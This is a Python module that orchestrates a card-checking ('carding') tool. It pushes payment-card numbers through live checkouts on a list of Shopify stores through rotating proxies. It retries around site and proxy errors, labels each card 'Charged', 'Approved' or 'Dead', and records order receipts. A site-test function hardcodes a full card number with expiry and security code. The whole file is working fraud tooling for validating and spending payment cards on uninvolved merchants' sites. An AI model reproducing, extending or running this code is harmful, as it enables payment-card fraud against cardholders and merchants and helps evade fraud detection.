#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Card-check orchestrator: classification + retry loop."""
import asyncio
import random

from async_engine import (
    CheckResult,
    CheckStatus,
    run_checkout_for_card_async,
)
from signals import (
    APPROVED_SIGNALS,
    CARD_DEAD_SIGNALS,
    CHARGED_SIGNALS,
    SITE_DEAD_SIGNALS,
    is_proxy_err,
    is_site_err,
)


def classify_result(res: CheckResult) -> str:
    """Return 'Charged' | 'Approved' | 'Dead' | 'Error'."""
    status = res.status
    msg    = (str(res.status_code or "") + " " + str(res.error or "")).lower()

    if status == CheckStatus.CHARGED:
        return "Charged"
    if any(s in msg for s in CHARGED_SIGNALS):
        return "Charged"

    if status == CheckStatus.APPROVED:
        if any(s in msg for s in CARD_DEAD_SIGNALS):
            return "Dead"
        return "Approved"
    if any(s in msg for s in APPROVED_SIGNALS):
        return "Approved"

    if status == CheckStatus.DECLINED:
        return "Dead"
    if any(s in msg for s in CARD_DEAD_SIGNALS):
        return "Dead"

    if status == CheckStatus.ERROR and res.retryable:
        return "Error"

    return "Dead"


def _make_result(card, status, message, price="-", gateway="Shopify Payments",
                 receipt_url="", retryable=False, proxy="", site=""):
    return {
        "status":      status,
        "message":     message,
        "card":        card,
        "gateway":     gateway,
        "price":       price,
        "receipt_url": receipt_url,
        "retry":       retryable,
        "proxy":       proxy,
        "site":        site,
    }


def _is_site_error(msg: str, msg_lower: str) -> bool:
    if is_site_err(msg):
        return True
    return any(s in msg_lower for s in SITE_DEAD_SIGNALS)


async def check_card_with_retry(card, sites, proxies,
                                max_retries=2, max_proxy_tries=None):
    if not sites:
        return _make_result(card, "Dead", "No sites configured")

    last_err   = "Unknown error"
    proxy_pool = list(proxies) if proxies else []
    MAX_TRIES  = max(max_proxy_tries or 0, max_retries, 5)
    failed_sites = set()

    for attempt in range(MAX_TRIES):
        available = [s for s in sites if s not in failed_sites] or list(sites)
        if not available:
            failed_sites.clear()
            available = list(sites)
        shop_url = random.choice(available)

        if proxy_pool:
            proxy_raw = random.choice(proxy_pool)
            proxy_url = proxy_raw
        else:
            proxy_raw = ""
            proxy_url = ""

        try:
            res = await run_checkout_for_card_async(shop_url, card, proxy_url)
        except Exception as exc:
            last_err = str(exc)
            if is_proxy_err(last_err) and attempt < MAX_TRIES - 1:
                await asyncio.sleep(0.2 * (attempt + 1))
                continue
            failed_sites.add(shop_url)
            if attempt < MAX_TRIES - 1:
                continue
            return _make_result(card, "Dead", last_err)

        verdict = classify_result(res)
        msg_str = str(res.status_code or res.error or "Error")

        if verdict == "Charged":
            return _make_result(
                card, "Charged", "ORDER PLACED",
                price=res.amount or "-",
                receipt_url=res.receipt_url or "",
                proxy=proxy_raw, site=shop_url,
                gateway=getattr(res, "gateway", "Shopify Payments"),
            )

        if verdict == "Approved":
            return _make_result(
                card, "Approved", msg_str,
                price=res.amount or "-",
                proxy=proxy_raw, site=shop_url,
                gateway=getattr(res, "gateway", "Shopify Payments"),
            )

        if verdict == "Error":
            last_err = msg_str
            if attempt < MAX_TRIES - 1:
                await asyncio.sleep(0.2 * (attempt + 1))
                continue
            return _make_result(card, "Dead", msg_str, retryable=True, site=shop_url)

        last_err  = msg_str
        msg_lower = last_err.lower()

        if is_proxy_err(last_err) and attempt < MAX_TRIES - 1:
            await asyncio.sleep(0.2 * (attempt + 1))
            continue

        if _is_site_error(last_err, msg_lower) and attempt < MAX_TRIES - 1:
            failed_sites.add(shop_url)
            continue

        if res.retryable and attempt < max_retries - 1:
            await asyncio.sleep(0.2)
            continue

        if any(s in msg_lower for s in CARD_DEAD_SIGNALS):
            return _make_result(card, "Dead", last_err, retryable=False, site=shop_url)

        return _make_result(card, "Dead", last_err,
                            retryable=res.retryable, site=shop_url)

    if proxy_pool:
        try:
            avail2   = [s for s in sites if s not in failed_sites] or list(sites)
            shop_url = random.choice(avail2)
            res      = await run_checkout_for_card_async(shop_url, card, "")
            verdict  = classify_result(res)
            if verdict == "Charged":
                return _make_result(card, "Charged", "ORDER PLACED",
                                    price=res.amount or "-",
                                    receipt_url=res.receipt_url or "", site=shop_url)
            if verdict == "Approved":
                return _make_result(card, "Approved",
                                    str(res.status_code or "APPROVED"),
                                    price=res.amount or "-", site=shop_url)
        except Exception:
            pass

    return _make_result(card, "Dead", last_err)


async def test_site(site: str, proxy: str) -> dict:
    try:
        proxy_url = proxy or ""
        test_card = "5154623245618097|03|2032|156"
        res = await run_checkout_for_card_async(site, test_card, proxy_url)
        alive = res.status != CheckStatus.ERROR or not res.retryable
        return {"site": site, "status": "alive" if alive else "dead"}
    except Exception:
        return {"site": site, "status": "dead"}
